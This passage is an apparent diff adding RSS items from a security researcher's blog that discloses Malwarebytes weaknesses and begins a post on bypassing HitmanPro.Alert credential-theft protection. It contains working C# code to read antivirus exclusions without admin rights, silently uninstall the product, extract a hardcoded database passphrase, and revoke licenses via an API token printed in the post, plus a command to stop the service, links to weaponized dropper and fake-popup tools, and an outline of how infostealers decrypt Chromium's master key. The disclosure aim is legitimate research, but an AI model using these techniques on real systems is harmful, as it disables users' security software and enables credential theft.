+            int num = Marshal.SizeOf(typeof(EXCLUSION_ITEM));
+            for (int i = 0; i &lt; protectionInfo.EntryCount; i++)
+            {
+                IntPtr ptr = new IntPtr(protectionInfo.pExclusionItem.ToInt64() + num * i);
+                EXCLUSION_ITEM eXCLUSION_ITEM = (EXCLUSION_ITEM)Marshal.PtrToStructure(ptr, typeof(EXCLUSION_ITEM));
+                switch (type)
+                {
+                    case PROTECTION_TYPE.WEB:
+                        {
+                            WebExclusionItem webExclusionItem = new WebExclusionItem();
+                            webExclusionItem.Type = eXCLUSION_ITEM.Type;
+                            webExclusionItem.Id = eXCLUSION_ITEM.Id;
+                            webExclusionItem.Address = eXCLUSION_ITEM.Value;
+                            configuredExclusion.mwacExclusion.WebExclusionList.Add(webExclusionItem);
+                            break;
+                        }
+                    case PROTECTION_TYPE.ANTI_RANSOMWARE:
+                        {
+                            MalwareExclusionItem malwareExclusionItem2 = new MalwareExclusionItem();
+                            malwareExclusionItem2.Type = eXCLUSION_ITEM.Type;
+                            malwareExclusionItem2.Id = eXCLUSION_ITEM.Id;
+                            malwareExclusionItem2.Path = eXCLUSION_ITEM.Value;
+                            configuredExclusion.arwExclusion.RansomwareExclusionList.Add(malwareExclusionItem2);
+                            break;
+                        }
+                    case PROTECTION_TYPE.MALWARE:
+                        {
+                            MalwareExclusionItem malwareExclusionItem = new MalwareExclusionItem();
+                            malwareExclusionItem.Type = eXCLUSION_ITEM.Type;
+                            malwareExclusionItem.Id = eXCLUSION_ITEM.Id;
+                            malwareExclusionItem.Path = eXCLUSION_ITEM.Value;
+                            configuredExclusion.malwareExclusion.MalwareExclusionList.Add(malwareExclusionItem);
+                            break;
+                        }
+                    case PROTECTION_TYPE.ANTI_EXPLOIT:
+                        {
+                            AeExclusionItem aeExclusionItem = new AeExclusionItem();
+                            aeExclusionItem.Hash = eXCLUSION_ITEM.Type;
+                            aeExclusionItem.Id = eXCLUSION_ITEM.Id;
+                            aeExclusionItem.Path = eXCLUSION_ITEM.Value;
+                            configuredExclusion.aeExclusion.AeExclusionList.Add(aeExclusionItem);
+                            break;
+                        }
+                }
+                Marshal.DestroyStructure(ptr, typeof(EXCLUSION_ITEM));
+            }
+            if (protectionInfo.pExclusionItem != IntPtr.Zero)
+            {
+                Marshal.FreeCoTaskMem(protectionInfo.pExclusionItem);
+            }
+        }
+    }
+    catch (Exception e)
+    {
+        Console.WriteLine(e.Message);
+    }
+    return true;
+}
+</code></pre>
+<p>Running it gives this output (<strong>no administrator</strong> privileges required):</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102832.png" alt="" loading="lazy"></figure>
+<p>Link to the repo:</p>
+<p><a href="https://github.com/miltinhoc/MbExclusionsPoc" target="_blank" rel="noopener noreferrer">https://github.com/miltinhoc/MbExclusionsPoc</a></p>
+<p>If you want to see this weaponized, check out a short YouTube video I made:</p>
+<p><a href="https://youtu.be/zu8glWNOH9s" target="_blank" rel="noopener noreferrer">https://youtu.be/zu8glWNOH9s</a></p>
+<p><strong>What happens on the video:</strong></p>
+<ol><li>I run the executable, which drops the  <code>mbcheck.dll</code>.</li><li>I retrieve the exclusion list.</li><li>I place an infostealer in the path that was listed as excluded.</li><li>I run the infostealer, which executes without issues because it's running from an excluded folder (otherwise caught by malwarebytes).</li></ol>
+<h2 id="flashback-to-last-time">Flashback to Last Time</h2>
+<p>This whole thing instantly reminded me of my last adventure with Malwarebytes. I had found a vulnerability that let a low‑privilege component trigger actions normally reserved for higher privileges, which, among other things, allowed me to terminate the antivirus altogether without administrator rights. I reported it properly and then things got weird.</p>
+<p>First, I got brushed off, then I got banned from reporting anything to Malwarebytes on HackerOne. </p>
+<p>When I mentioned that in a group chat, Thomas (creator of Malcore) offered to host my write-up on his blog. A few days later, Malwarebytes suddenly reopened the report, apologised, and even paid me for the finding.</p>
+<p>The ban, however, was never lifted. So I'm still blocked from submitting vulnerabilities directly to Malwarebytes.</p>
+<p>If you want the full story, here's my previous post:</p>
+<p><a href="https://miltinhoc.gitbook.io/malware-dev/exploring-a-security-flaw-in-malwarebytes" target="_blank" rel="noopener noreferrer">https://miltinhoc.gitbook.io/malware-dev/exploring-a-security-flaw-in-malwarebytes</a></p>
+<h2 id="fun-discoveries">Fun discoveries</h2>
+<h3 id="ticket-creation">Ticket creation</h3>
+<p>The tool can create support tickets, which makes sense for a support app, but that same capability can be abused to flood the support system with large volumes of tickets.</p>
+<p>Below is a request showing the structure of the <strong>POST</strong> request used by the tool to open a ticket</p>
+<pre class="language-csharp"><code class="language-csharp">var client = new HttpClient();
+var request = new HttpRequestMessage(HttpMethod.Post, &quot;https://support-tool.malwarebytes.com/api/v2/tickets&quot;);
+request.Headers.Add(&quot;Authorization&quot;, &quot;24be141e4427de6ccd4f29f1a3341668&quot;);
+var content = new StringContent(&quot;{\&quot;group_id\&quot;: \&quot;\&quot;,\&quot;name\&quot;: \&quot;miltin\&quot;,\&quot;email\&quot;: \&quot;miltin@proton.me\&quot;,\&quot;subject\&quot;: \&quot;cannot open malwarebytes\&quot;,\&quot;body\&quot;: \&quot;I cannot open Malwarebytes UI\&quot;,\&quot;fields\&quot;: {  \&quot;product\&quot;: \&quot;wf_product_malwarebytes_for_windows\&quot;,  \&quot;issue_type\&quot;: \&quot;malwarebytes_dont_open\&quot;,  \&quot;operating_system_version\&quot;: \&quot;os_version_windows_64_bit\&quot;}}&quot;, null, &quot;application/json&quot;);
+request.Content = content;
+var response = await client.SendAsync(request);
+</code></pre>
+<p>The <code>product</code> and <code>operating_system_version</code> can vary:</p>
+<p><strong>Product values:</strong></p>
+<ul><li><code>wf_product_anti_exploit_for_windows</code></li><li><code>wf_product_anti_ransomware_for_windows</code></li><li><code>wf_product_anti_malware_for_windows</code></li><li><code>wf_product_malwarebytes_for_windows</code></li></ul>
+<p><strong>Operating System values:</strong></p>
+<p>They always start with <code>os_version_</code>, followed by your Windows version (with <code>.</code> replaced by <code>_</code>), and then the architecture.</p>
+<p>Examples:</p>
+<ul><li><code>os_version_windows_10_64_bit</code></li><li><code>os_version_windows_8_1_64_bit</code></li><li><code>os_version_windows_8_32_bit</code></li></ul>
+<p>😏 <strong>Next malware idea:</strong> Infects victim ➨ Opens 1,000 Malwarebytes support tickets ➨ Exits</p>
+<h3 id="silent-uninstall">Silent uninstall</h3>
+<p>You can actually uninstall Malwarebytes silently. </p>
+<p>To do this, you only need to:</p>
+<ol><li>Find the Malwarebytes Installation folder.</li><li>Call <code>mbuns.exe /uninstall /nosurvey /silent</code>.</li></ol>
+<p>Example code:</p>
+<pre class="language-csharp"><code class="language-csharp">string programFilesPath = Environment.ExpandEnvironmentVariables(&quot;%ProgramW6432%&quot;);
+string mbPath = Path.Combine(programFilesPath, &quot;Malwarebytes\\Anti-Malware&quot;);
+
+ProcessStartInfo startInfo = new ProcessStartInfo(Path.Combine(mbPath, &quot;mbuns.exe&quot;))
+{
+	Arguments = &quot;/uninstall /nosurvey /silent&quot;,
+	CreateNoWindow = true,
+	UseShellExecute = false
+};
+
+using (Process process = new Process())
+{
+	process.StartInfo = startInfo;
+	process.Start();
+	process.WaitForExit(300000);
+}
+</code></pre>
+<p>Now, this would be harder to pull off if the UAC prompt comes from your own executable, but you can actually make it come from malwarebytes signed executable to look more legitimate, to do this, as I had done on the previous post, I created a fake popup that asks the user to turn on auto updates.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102911.png" alt="" loading="lazy"></figure>
+<p>When the user clicks it, there are two main approaches I tested. They work almost the same, differing only in what UAC prompt is displayed to the user:</p>
+<ol><li>You drop <code>malwarebytes_assistant.exe</code> with a modified version of <code>malwarebytes_assistant.dll</code>, which will be the one calling <code>mbuns.exe</code>.</li><li>You call <code>mbuns.exe</code> directly.</li></ol>
+<p>Since many actions already prompt the user for elevation, for example, turning off any of the real-time protections, this wouldn't seem too suspicious.</p>
+<h3 id="real-time-notifications">Real-time notifications?</h3>
+<p>Malwarebytes stores data in a SQLite database located at <code>%localappdata%\Malwarebytes\data.db</code>. When I tried opening this database, I received the following message:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102917.png" alt="" loading="lazy"></figure>
+<p>This indicates that the database is encrypted. After some digging, I found the password inside <code>MbamUI.Data.dll</code> in the <code>AppDbContextFactory</code> class. This is not a DLL from the support tool but rather from malwarebytes itself.</p>
+<p>The database contains several tables:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102923.png" alt="" loading="lazy"></figure>
+<p>What caught my attention was the <code>Notifications</code> table, which shows, among other information, the threats blocked by Malwarebytes:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102930.png" alt="" loading="lazy"></figure>
+<p>At first, I tried triggering another "threat blocked" alert to see if new entries would show up in real time. However, nothing appeared in the table. </p>
+<p>After looking more closely in the folder where the database is stored, I found a few additional files:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509102936.png" alt="" loading="lazy"></figure>
+<p>It turns out Malwarebytes uses <strong>Write-Ahead Logging</strong> <strong>(WAL)</strong>. This means that real-time changes are first written to <code>data.db-wal</code>, and from my testing, only when Malwarebytes shuts down (or the system is turned off) are those changes merged into <code>data.db</code>.</p>
+<h4 id="forcing-wal-merges">Forcing WAL Merges</h4>
+<p>Luckily for us, it's possible to force these merges manually, here is an example code that:</p>
+<ol><li>Extract the passphrase from <code>MbamUI.Data.dll</code>.</li><li>Open the encrypted database.</li><li>Force a WAL merge.</li><li>Query all stored threat notifications.</li></ol>
+<pre class="language-csharp"><code class="language-csharp">string programFilesPath = Environment.ExpandEnvironmentVariables(&quot;%ProgramW6432%&quot;);
+string mbPath = Path.Combine(programFilesPath, &quot;Malwarebytes\\Anti-Malware&quot;);
+
+var mbamuiPath = Path.Combine(mbPath, &quot;MbamUI.Data.dll&quot;);
+var assembly = Assembly.LoadFrom(mbamuiPath);
+
+var type = assembly.GetType(&quot;MbamUI.Data.AppDbContextFactory&quot;);
+var field = type?.GetField(&quot;PassPhrase&quot;, BindingFlags.Public | BindingFlags.Static);
+
+string? pass = field?.GetValue(null) as string;
+
+string remoteDbPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), &quot;Malwarebytes&quot;, &quot;data.db&quot;);
+
+var encryptedConnectionString = new SqliteConnectionStringBuilder
+{
+    DataSource = remoteDbPath,
+    Mode = SqliteOpenMode.ReadWrite,
+    Password = pass
+}.ToString();
+
+using (var encryptedConnection = new SqliteConnection(encryptedConnectionString))
+{
+    encryptedConnection.Open();
+    
+    //forces merge
+    using (var cmd = encryptedConnection.CreateCommand())
+    {
+        cmd.CommandText = &quot;PRAGMA wal_checkpoint(TRUNCATE);&quot;;
+        cmd.ExecuteNonQuery();
+    }
+
+    using (var cmd = encryptedConnection.CreateCommand())
+    {
+        cmd.CommandText = &quot;SELECT Timestamp,ThreatName,ObjectName FROM Notifications WHERE ThreatName IS NOT NULL;&quot;;
+
+        using (var reader = cmd.ExecuteReader())
+        {
+            while (reader.Read())
+            {
+                var timestamp = reader.GetString(0);
+                var threatName = reader.GetString(1);
+                string ObjectName = reader.GetString(2);
+
+                Console.WriteLine($&quot;{timestamp} | [{threatName}] {ObjectName}&quot;);
+            }
+        }
+    }
+}
+</code></pre>
+<h4 id="real-time-monitoring">Real-Time Monitoring</h4>
+<p>To take this further, you could combine the database logic with a <a href="https://learn.microsoft.com/en-us/dotnet/api/system.io.filesystemwatcher?view=net-9.0" target="_blank" rel="noopener noreferrer">FileSystemWatcher</a> monitoring changes to <code>data.db-wal</code>. Each time the WAL file changes, you trigger a merge and query the <code>Notifications</code> table again. This effectively gives you a real-time view of blocked threats.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103002.png" alt="" loading="lazy"></figure>
+<p>Check a POC project on Github:</p>
+<p><a href="https://github.com/miltinhoc/MbThreatTracker/" target="_blank" rel="noopener noreferrer">https://github.com/miltinhoc/MbThreatTracker</a></p>
+<h3 id="downgrade-malwarebytes">Downgrade Malwarebytes?</h3>
+<p>While testing the Malwarebytes support tool, I noticed that one of its intended steps seems to involve unredeeming the current subscription and storing a backup of the license on the desktop. In practice, I wasn't able to confirm the unredeem step being executed, but the code for it is clearly present in the tool.</p>
+<p><strong>Installation Token</strong></p>
+<p>Among the exported functions of <code>mbcheck.dll</code> is <code>GetInstallationToken</code>.\ This function returns a Base64-encoded string:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509103014.png" alt="" loading="lazy"></figure>
+<p><strong>Forcing Subscription Removal</strong></p>
+<p>If this value could be decrypted, which I believe should be possible, although I haven't managed to do it yet, you could then make a <strong>POST</strong> request like this:</p>
+<pre class="language-csharp"><code class="language-csharp">private static async Task UnredeemLicense(string installationToken)
+{
+    string keystoneProdToken = &quot;jqnjxFME71yp1qsLTnyn&quot;;
+
+    using (var client = new HttpClient())
+    {
+        string keystoneProd = &quot;https://keystone.mwbsys.com/api/v1/installations/unredeem&quot;;
+        client.DefaultRequestHeaders.Add(&quot;Authorization&quot;, $&quot;Token token={keystoneProdToken}&quot;);
+
+        var formData = new Dictionary&lt;string, string&gt;
+        {
+            { &quot;installation_token&quot;, installationToken },
+            { &quot;reason&quot;, &quot;uninstall&quot; }
+        };
+
+        var content = new FormUrlEncodedContent(formData);
+        HttpResponseMessage response = await client.PostAsync(keystoneProd, content);
+        response.EnsureSuccessStatusCode();
+    }
+}
+</code></pre>
+<p>During my testing, I was able to capture my real installation token by inspecting Malwarebytes HTTP traffic. When I supplied this real token in the POST request, my active subscription was immediately terminated, which in turn instantly disabled real-time protection on the machine.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>The Malwarebytes Support Tool exposed several flaws:</p>
+<ul><li>A low‑privilege process can read the exclusions list, which can be used to run malicious binaries from excluded paths.</li><li>The product's logging/notification mechanism (WAL + encrypted DB) can be forced into revealing blocked‑threat information in near real time.</li><li>The support tool can create tickets and perform silent uninstalls, features that, if abused, could be misused.</li><li>There is code to unredeem installations. With a valid installation token this can disable subscriptions and thereby turn off real‑time protection.</li></ul>
+<p>Finally, and most importantly, these issues remain unresolved as of <strong>02/10/2025</strong>.</p>]]></content:encoded>
+    </item>
+    <item>
+      <title>Exploring a Security Flaw in Malwarebytes</title>
+      <link>https://msil.re/posts/exploring-a-security-flaw-in-malwarebytes.html</link>
+      <guid isPermaLink="true">https://msil.re/posts/exploring-a-security-flaw-in-malwarebytes.html</guid>
+      <pubDate>Wed, 30 Oct 2024 00:00:00 +0000</pubDate>
+      <category>reverse-engineering</category>
+      <category>malwarebytes</category>
+      <category>privesc</category>
+      <description>Two assistant binaries, near-identical code, very different blast radius. A path from .NET tampering to disabling Malwarebytes self-protection without admin.</description>
+      <content:encoded><![CDATA[<h2 id="introduction">Introduction</h2>
+<p>While messing around with a tool I built to search for .NET assemblies, I saw Malwarebytes pop up, It’s not every day you see an antivirus using .NET 🤓, so naturally, I got curious and started looking.</p>
+<h2 id="overview-of-malwarebytes">Overview of Malwarebytes</h2>
+<p>Malwarebytes has a user interface built with <strong>WPF</strong> (Windows Presentation Foundation), which is a framework for creating desktop applications on Windows and runs on .NET Core 6, along with some other .NET versions for other DLLs.</p>
+<h3 id="how-it-communicates">How it communicates</h3>
+<p>To communicate with it's service (<strong>MBAMService</strong>), Malwarebytes uses named pipes and COM objects.</p>
+<pre class="language-csharp"><code class="language-csharp">public static async Task&lt;T&gt; ConnectToServiceAsync&lt;T&gt;(Guid classGuid, string pipeName, int connectionTimeout, CancellationToken cancellationToken) where T : class
+{
+	string text = string.Empty;
+	using (NamedPipeClientStream pipe = new NamedPipeClientStream(&quot;.&quot;, pipeName, PipeDirection.InOut, PipeOptions.Asynchronous))
+	{
+		if (connectionTimeout == 2147483647)
+		{
+			await pipe.ConnectAsync(cancellationToken).ConfigureAwait(false);
+		}
+		else
+		{
+			await pipe.ConnectAsync(connectionTimeout, cancellationToken).ConfigureAwait(false);
+		}
+		pipe.ReadMode = PipeTransmissionMode.Message;
+		byte[] bytes = Encoding.Unicode.GetBytes(&quot;NeedAKey&quot;);
+		await pipe.WriteAsync(bytes, 0, bytes.Length, cancellationToken).ConfigureAwait(false);
+		byte[] buffer = new byte[256];
+		int num = await pipe.ReadAsync(buffer, 0, 256, cancellationToken).ConfigureAwait(false);
+		text = Encoding.Unicode.GetString(buffer, 0, num);
+		buffer = null;
+	}
+	NamedPipeClientStream pipe = null;
+	return (Ole32.CoGetClassObject(classGuid, RegistrationClassContext.LocalServer, IntPtr.Zero, typeof(IClassFactory2).GUID) as IClassFactory2).CreateInstanceLic(null, null, typeof(T).GUID, text) as T;
+}
+</code></pre>
+<p>The <code>ConnectToServiceAsync</code> method establishes a connection using the named pipe "MBLG."</p>
+<p>Once connected, it sends a message, <code>NeedAKey</code> to request a key. An example of a received key might look like this: <code>C6110F4E09A0C4ED82231F627C2D6B8AE782437BED9B7361BB99525F6D852ABE</code>.</p>
+<p>After obtaining the key, the <code>CoGetClassObject</code> function retrieves a COM class factory, and the <code>CreateInstanceLic</code> method uses the received key to create an instance of the service controller (<strong>IMBAMServiceControllerX</strong>).</p>
+<h3 id="controllers-in-malwarebytes">Controllers in Malwarebytes</h3>
+<p>Malwarebytes has an extensive set of controllers, each with their specific functions, that help manage various functionalities within the application.</p>
+<figure><img src="https://msil.re/assets/images/controlers.png" alt="" loading="lazy"></figure>
+<p>Here are a few examples:</p>
+<ul><li><code>IAEControllerX</code>: Handles the Anti-Exploit features.</li><li><code>ICloudControllerX</code>: Handles interactions with cloud services.</li><li><code>ILogControllerX</code>: Responsible for logging events and activities within the application.</li><li><code>IMBAMServiceControllerX</code>: Acts as the main interface for communicating with the Malwarebytes service.</li><li><code>ITelemetryControllerX</code>: Handles the collection and transmission of telemetry data back to Malwarebytes.</li></ul>
+<h3 id="digging-into-the-assistant-binaries">Digging into the Assistant Binaries</h3>
+<p>One of the other things that raised my attention was 2 binaries on Malwarebytes folder:</p>
+<ul><li>assistant.dll</li><li>malwarebytes_assistant.dll</li></ul>
+<p>I first started by looking at assistant.dll.</p>
+<figure><img src="https://msil.re/assets/images/assistant-entry.png" alt="" loading="lazy"></figure>
+<p>The <code>AssistantHelper</code> class is responsible for connecting to the <strong>MBAMService</strong> and instantiating the service controller using the same method that we previously saw.</p>
+<figure><img src="https://msil.re/assets/images/connect-service.png" alt="" loading="lazy"></figure>
+<p>The <code>Assistant</code> class however is a bit more interesting, it checks if the first argument starts with "-" and if yes, tries to parse it from a list of defined commands</p>
+<figure><img src="https://msil.re/assets/images/comands.png" alt="" loading="lazy"></figure>
+<p>A lot of these commands are related to views, so for example, if I send a <code>-AddExclusion</code>, I go to this menu inside Malwarebytes:</p>
+<figure><img src="https://msil.re/assets/images/malwarebytes-view.png" alt="" loading="lazy"></figure>
+<p>This alone is not a problem, all the defined commands do not impact the functionality of Malwarebytes, since there is no command to disable protective features, only to enable them.</p>
+<p>Furthermore, I found no references to this binary in any other binary, so I believe it is primarily used for tasks involving Malwarebytes URL protocol, as you can run any of these commands by using <code>malwarebytes://&lt;command&gt;</code>.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225232748.png" alt="" loading="lazy"></figure>
+<p>I then shifted my focus to the other binary (malwarebytes_assistant.dll). This one seems more interesting, as it requires you to run it as an administrator.</p>
+<p>When checking its entry point, it appears almost identical to assistant.dll, with the main difference the commands it provides.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225232802.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225232810.png" alt="" loading="lazy"></figure>
+<p><strong>Example of a few commands:</strong></p>
+<ol><li>Stop the service: <code>--StopService</code></li><li>Disable ransomware protection: <code>--DisableRw</code></li><li>Disable exploit protection: <code>--DisableAe</code></li><li>Disable web protection: <code>--DisableWebProtection</code></li><li>Disable malware pup protection: <code>--DisableRtp</code></li></ol>
+<p>I think Malwarebytes chose this approach to trigger a UAC prompt for specific actions, like disabling real-time protection settings.</p>
+<p>When you try to disable any real-time protection, what actually happens is that Malwarebytes calls the <code>malwarebytes_assistant</code> to perform the action. This allows them to prompt the user for elevated privileges when necessary, making it harder to disable protections without administrative approval.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225232842.png" alt="" loading="lazy"></figure>
+<p>Because of this, all an attacker would need to do is, for example, run the following command:</p>
+<p><code>Start-Process -FilePath &quot;C:\Program Files\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe&quot; -ArgumentList &quot;--StopService&quot;</code></p>
+<p>Without admin privileges, this will trigger a UAC prompt. In a corporate setting, it may be harder to exploit due to tighter security, but on a typical user's machine, many might unknowingly click 'Yes' on a prompt from a trusted Malwarebytes binary. While this relies on the user’s approval, it's still a potential security issue.</p>
+<p>Another concern I mentioned is the lack of file integrity checking. In .NET Core, the .exe is just a launcher, while the actual code resides in the .dll files.</p>
+<p>Even though the executable is signed, an attacker could modify the DLLs, and the application would still run. This allows malicious code injection, enabling actions like adding exclusions or interacting with other Malwarebytes controllers.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225232856.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225232900.png" alt="" loading="lazy"></figure>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225232903.png" alt="" loading="lazy"></figure>
+<h3 id="why-i-think-this-is-a-security-concern">Why I think This is a Security Concern</h3>
+<p>Modern antivirus solutions are designed with robust protections to prevent unauthorized access and tampering, even for users with admin privileges.</p>
+<p>The whole idea behind these systems is to maintain the integrity of the software and ensure that TA's can’t easily manipulate it.</p>
+<p>I think that having a signed binary that allows you to stop the service or stop protection settings by passing user arguments poses a significant security risk.</p>
+<h2 id="malwarebytes-response">Malwarebytes response</h2>
+<p>The response from malwarebytes was a bit underwhelming. They focused heavily on the idea that if you have admin privileges, you can already do whatever you want with the system.</p>
+<p>I refuted that by showing a screenshot of a system prompt where I try to stop the service and kill the process but fail.</p>
+<figure><img src="https://msil.re/assets/images/system-cmd.png" alt="" loading="lazy"></figure>
+<p>They then sent me a link to a Microsoft blog post that essentially said, “Not every code injection bug is a security hole.” After that, they locked the thread, cutting off any chance for further discussion.</p>
+<figure><img src="https://msil.re/assets/images/response.png" alt="" loading="lazy"></figure>
+<p>Even though I understand that needing admin privileges makes it less critical, I still think this is a valid problem and could be abused.</p>
+<p>Many modern antivirus solutions implement protections that prevent even an admin from disabling or tampering with the antivirus, including Malwarebytes, which has a self-protection module.</p>
+<figure><img src="https://msil.re/assets/images/selfprotection.png" alt="" loading="lazy"></figure>
+<h2 id="conclusion">Conclusion?</h2>
+<p>While writing this blog post, I started thinking about the two assistant binaries again.</p>
+<p>Since they have almost identical code, differing mainly in the commands they support and the fact that one requires admin privileges while the other doesn’t, I decided to experiment.</p>
+<p>I modified the DLL that doesn't need admin access (<code>assistant.dll</code>) and attempted to run some commands to try and stop the service.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225232944.png" alt="" loading="lazy"></figure>
+<p>While my initial attempt to stop the service failed, after testing a few more commands, I was able to:</p>
+<ol><li>Disable Tamper protection</li><li>Disable Self-Protection</li><li>Disable Malwarebytes running on windows startup</li><li>Disable Automatic quarantine for malware</li></ol>
+<p>This was done by modifying an already existing method, in this case <code>EnableRw</code>.</p>
+<p>This method normally enables ransomware protection, but I modified it to this:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225233001.png" alt="" loading="lazy"></figure>
+<p>So the attack flow would be:</p>
+<ol><li>Drop the modified file and all the needed files for it to run:</li></ol>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225233020.png" alt="" loading="lazy"></figure>
+<ol><li>Call the modified version: <code>mb.exe -EnableRtp</code>.  </li><li>Add persistence to target machine (this can also be done from inside <code>assistant.dll</code>).</li><li>Reboot the machine (so that Malwarebytes doesn't start).</li><li>Run malicious actions.</li></ol>
+<p>Since this does not require admin to do, I decided to report this one as a new report to Malwarebytes.</p>
+<p>For my surprise, the same person that previously reviewed my other report, sent a message saying it was irrelevant because admin privileges were needed (??), which makes me think the person in question didn't even read the report. The thread was then immediately locked leaving me no possibility to comment.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225233040.png" alt="" loading="lazy"></figure>
+<p>Because the thread was locked, I was not able to respond on this report, I tried to open another one and clarify further the issue</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225233046.png" alt="" loading="lazy"></figure>
+<p>This report was also closed/locked with no message and I was banned from reporting any more issues to Malwarebytes for spam</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225233055.png" alt="" loading="lazy"></figure>
+<h3 id="tooling">Tooling</h3>
+<p>During this I developed a tool to interact with Malwarebytes, this tool lets you disable real-time protection, stop the service, add exclusions and remove notifications entirely, and I am currently adding more stuff to it.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225233114.png" alt="" loading="lazy"></figure>
+<p><a href="https://github.com/miltinhoc/MbToolkit" target="_blank" rel="noopener noreferrer">https://github.com/miltinhoc/MbToolkit</a></p>
+<hr>
+<p>Another little tool I develop was a fake popup that pretends to be a Malwarebytes notification, when you try to click on "Turn On", it tries to stop the Malwarebytes service using malwarebytes_assistant.exe.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225233133.png" alt="" loading="lazy"></figure>
+<p><a href="https://github.com/miltinhoc/FakePopup" target="_blank" rel="noopener noreferrer">https://github.com/miltinhoc/FakePopup</a></p>
+<hr>
+<p>And to finalize I also made a tool that does what I reported on my second report, it drops a modified version of Malwarebytes and disables self-protect, tamper protection automatic malware quarantine and Malwarebytes startup with windows.</p>
+<p><a href="https://github.com/miltinhoc/MalwarebytesDropper" target="_blank" rel="noopener noreferrer">https://github.com/miltinhoc/MalwarebytesDropper</a></p>
+<h3 id="final-conclusion">Final Conclusion</h3>
+<p>At the end of the day, it’s up to Malwarebytes to decide whether to accept or deny a report, and even though I do not agree with them, I must respect their decision. The only thing I can do is share my findings and add this one to my toolkit for the future If I ever come across Malwarebytes during any assignments.</p>
+<h1 id="update">Update</h1>
+<p>Two days ago, on October 28th, my report was reopened, and I received a message:</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020250225233209.png" alt="" loading="lazy"></figure>
+<p>I wasn’t expecting this, especially since I was banned from reporting almost a month ago, had written this post, and as time passed, I stopped believing they would actually do anything about it.</p>
+<p>But, I’m happy that they actually reviewed my report and In the end everything worked out well.</p>]]></content:encoded>
+    </item>
+    <item>
+      <title>Bypassing HitmanPro.Alert Credential-Theft protection</title>
+      <link>https://msil.re/posts/bypassing-hitmanpro-alert-credential-theft.html</link>
+      <guid isPermaLink="true">https://msil.re/posts/bypassing-hitmanpro-alert-credential-theft.html</guid>
+      <pubDate>Fri, 01 Mar 2024 00:00:00 +0000</pubDate>
+      <category>bypass</category>
+      <category>infostealer</category>
+      <category>dpapi</category>
+      <description>A simple swap of the Chromium Local State master key tricks HitmanPro.Alert&#x27;s anti-credential-theft module into looking the other way.</description>
+      <content:encoded><![CDATA[<h2 id="what-are-infostealers">What are Infostealers</h2>
+<p>Infostealers are malware design to steal/extract sensitive information from an infected computer.</p>
+<p>This sensitive information can be (but not limited to):</p>
+<ul><li>Browser cookies</li><li>Saved passwords</li><li>Credit cards information</li><li>Crypto wallets</li><li>Discord Tokens</li></ul>
+<h2 id="understanding-infostealers">Understanding Infostealers</h2>
+<p>Infostealers are designed to extract sensitive information stored on browsers, such as passwords and credit card details.</p>
+<p>In Chromium-based browsers, this data is saved on disk and encrypted for security. The encryption utilizes a master key, which is itself encrypted and stored in a file.</p>
+<p>The master key's encryption is achieved using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata" target="_blank" rel="noopener noreferrer">CryptProtectData </a>function.</p>
+<h3 id="data-protection-api-dpapi"><strong>Data Protection API</strong> (DPAPI)</h3>
+<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata" target="_blank" rel="noopener noreferrer">CryptProtectData</a> function is part of the <strong>Data Protection API</strong> (DPAPI).</p>
+<p>Data encrypted with this function can only be decrypted by a user with the same credentials and typically needs to be done on the same machine.</p>
+<p>Generally, only a user who has the same login credentials as the one who encrypted the data is able to decrypt it, in addition, both the encryption and decryption processes typically need to occur on the same computer.</p>
+<p>Because of this, infostealers are forced to use this api during runtime.</p>
+<p>To access the encrypted data, one can use the <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata" target="_blank" rel="noopener noreferrer">CryptUnprotectData</a> function to decrypt the master key, which can then be used to decrypt cookies, passwords, and other stored data.</p>
+<h2 id="infostealers-flow">Infostealers flow</h2>
+<h3 id="locate-and-access-the-local-state"><strong>Locate</strong> and access the <code>Local State</code></h3>
+<p><code>Local State</code> is a JSON file containing various settings and metadata about the browser, including the master key (in <code>os_crypt.encrypted_key)</code>.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104842.png" alt="" loading="lazy"></figure>
+<h3 id="decrypt-the-master-key"><strong>Decrypt</strong> the master key.</h3>
+<p>Next step is to base64 decode the master key to bytes, skip the first 5 bytes from the beggining and then decrypt it using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata" target="_blank" rel="noopener noreferrer">CryptUnprotectData</a> function.</p>
+<figure><img src="https://msil.re/assets/images/Pasted%20image%2020260509104849.png" alt="" loading="lazy"></figure>
+<h3 id="extract-cookies-and-login-information"><strong>Extract</strong> cookies and login information.</h3>
